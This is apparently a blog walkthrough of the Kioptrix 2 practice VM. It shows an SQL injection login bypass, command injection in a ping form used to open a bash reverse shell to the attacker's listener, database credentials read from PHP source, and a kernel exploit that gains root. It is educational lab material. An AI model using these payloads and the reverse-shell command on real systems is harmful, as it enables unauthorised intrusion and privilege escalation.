Firstly, we visit the web page and are greeted by a login page.

![](/assets/img/kioptrix2/1.png)
 
I didn't really know SQL Injection when I was doing this box, and I did end up looking up the solution for bypassing this login form, as below:

```mysql
' or 1=1 --
```

This is a pretty standard example of an SQL injection and gives us access to form allowing us to ping a device on the network.  This immediately suggested some form of command injection.  Since it's a vulnerable machine, it seemed fairly obvious that we could input some other command. 

![](/assets/img/kioptrix2/2.png)

So lets try and spawn a reverse shell.

```bash
192.168.137.128 && bash -i >& /dev/tcp/192.168.137.128/1234 0>&1
```

Boom!  We have a shell.

```bash
root@kali:/usr/share/wordlists# nc -l -p 1234 -vvv
listening on [any] 1234 ...
192.168.137.133: inverse host lookup failed: Unknown host
connect to [192.168.137.128] from (UNKNOWN) [192.168.137.133] 32771
bash: no job control in this shell
bash-3.00$ ls
index.php
pingit.php
bash-3.00$ 
```

Let's have a look inside the php files and see if we see anything interesting.  Inside index.php after a little searching we find some credentials to the local mysql database.

```bash
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
```
Unfortunately, dumping the database didn't appear to yield us many more more ways of progressing.  So we have a look at the kernel version and search for exploits.

```
CentOS release 4.5 (Final)

Linux version 2.6.9-55.EL 
```
We searchsploit and come across a number of different candidates, but we find one in particular which appears to yield us some success.

```bash
Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation 
```

Downloading and compiling greets us with the following error message:
```bash
bash-3.00$ ./9545
sh: no job control in this shell
```
So we just need to upgrade this shell to a tty.

```bash
>>> import pty
import pty
>>> pty.spawn('./9545')
pty.spawn('./9545')
sh-3.00# ls
ls
9542.c	9545  9545.c  break  dump.sql
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
```
Rooted!
